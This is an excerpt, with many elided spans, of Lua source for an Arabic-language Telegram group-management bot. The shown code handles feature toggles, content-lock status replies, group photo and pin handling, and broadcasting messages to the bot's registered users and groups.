local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تعطيل الريمكس" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevAbs:get(SURSBER..'Rio:Remix:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and SourceCh(msg) or text == "تعطيل الصوره" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevAbs:get(SURSBER..'Rio:Photo:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and SourceCh(msg) or text == "تعطيل الانمي" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevAbs:get(SURSBER..'Rio:Anime:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevAbs:get(SURSBER..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevAbs:get(SURSBER..'Rio:Series:Rio'..msg.chat_id_) and SourceCh(msg) then
...
--     Source SURSBER     --
if Admin(msg) then
if DevAbs:get(SURSBER..'Rio:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevAbs:get(SURSBER..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevAbs:get(SURSBER..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevAbs:get(SURSBER..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الملصقات" then if DevAbs:get(SURSBER..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الصور" then if DevAbs:get(SURSBER..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevAbs:get(SURSBER..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الاونلاين" then if DevAbs:get(SURSBER..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الدردشه" then if DevAbs:get(SURSBER..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevAbs:get(SURSBER..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الاغاني" then if DevAbs:get(SURSBER..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevAbs:get(SURSBER..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevAbs:get(SURSBER..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الماركداون" then if DevAbs:get(SURSBER..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الهاشتاك" then if DevAbs:get(SURSBER..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "التعديل" then if DevAbs:get(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "التثبيت" then if DevAbs:get(SURSBER..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الاشعارات" then if DevAbs:get(SURSBER..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الكلايش" then if DevAbs:get(SURSBER..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الدخول" then if DevAbs:get(SURSBER..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local SURSBERTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الشبكات" then if DevAbs:get(SURSBER..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "المواقع" then if DevAbs:get(SURSBER..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "العربيه" then if DevAbs:get(SURSBER..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الانكليزيه" then if DevAbs:get(SURSBER..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local SURSBERTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الكفر" then if DevAbs:get(SURSBER..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local SURSBERTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الفشار" then if DevAbs:get(SURSBER..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local SURSBERTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
if text == "الطائفيه" then if DevAbs:get(SURSBER..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local SURSBERTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SURSBERTeam, 1, 'md') end
end
--     Source SURSBER     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source SURSBER     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source SURSBER     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source SURSBER     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source SURSBER     --
if RioSudo(msg) then
...
--     Source SURSBER     --
if msg.content_.photo_ then
if DevAbs:get(SURSBER..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevAbs:del(SURSBER..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevAbs:del(SURSBER..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevAbs:set(SURSBER..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source SURSBER     --
...
if data.ID == "Ok" then
DevAbs:del(SURSBER..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevAbs:get(SURSBER..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevAbs:del(SURSBER..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevAbs:scard(SURSBER.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevAbs:scard(SURSBER.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevAbs:scard(SURSBER.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevAbs:scard(SURSBER.."Rio:Managers:"..ChatId) or 0
local MutedList = DevAbs:scard(SURSBER.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevAbs:scard(SURSBER.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevAbs:scard(SURSBER.."Rio:Admins:"..ChatId) or 0
local VipList = DevAbs:scard(SURSBER.."Rio:VipMem:"..ChatId) or 0
...
DevAbs:srem(SURSBER.."Rio:Groups", dp.id_)
else
...
DevAbs:set(SURSBER..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:FreeBot'..SURSBER) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:FreeBot'..SURSBER,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source SURSBER     --
...
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevAbs:sadd(SURSBER.."Rio:Groups",msg.chat_id_)
if not DevAbs:get(SURSBER..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevAbs:incrby(SURSBER..'Rio:Sudos'..msg.sender_user_id_,1)
DevAbs:set(SURSBER..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevAbs:sismember(SURSBER..'Rio:Groups',msg.chat_id_) then
...
for k,v in pairs(List) do
local GroupsManagers = DevAbs:scard(SURSBER.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevAbs:scard(SURSBER.."Rio:Admins:"..v) or 0
local Groupslink = DevAbs:get(SURSBER.."Rio:Groups:Links" ..v)
...
DevAbs:setex(SURSBER.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(SURSBER.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(SURSBER.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAbs:smembers(SURSBER..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevAbs:setex(SURSBER.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(SURSBER.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(SURSBER.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAbs:smembers(SURSBER..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevAbs:setex(SURSBER.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(SURSBER.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(SURSBER.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAbs:smembers(SURSBER..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevAbs:setex(SURSBER.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(SURSBER.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(SURSBER.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAbs:smembers(SURSBER..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevAbs:setex(SURSBER.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(SURSBER.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(SURSBER.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevAbs:smembers(SURSBER.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevAbs:set(SURSBER..'Rio:PinnedMsgs'..v,photo) 
